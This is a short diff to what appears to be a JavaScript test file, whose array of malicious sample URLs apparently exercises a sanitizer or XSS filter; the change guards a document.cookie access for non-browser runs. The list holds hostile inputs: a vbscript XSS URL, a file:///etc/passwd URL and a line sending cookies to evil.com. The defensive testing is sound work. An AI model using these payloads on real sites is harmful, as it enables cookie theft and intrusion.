@@ -60,7 +60,7 @@ const MALICIOUS_URLS = [
   'vbscript:MsgBox "XSS"',
   'file:///etc/passwd',
   'ftp://evil.com/script.js',
-  'http://evil.com/steal?cookie=' + encodeURIComponent(document.cookie),
+  'http://evil.com/steal?cookie=' + (typeof document !== 'undefined' ? encodeURIComponent(document.cookie) : 'test'),
 ];
 
 // Contenido seguro para comparar
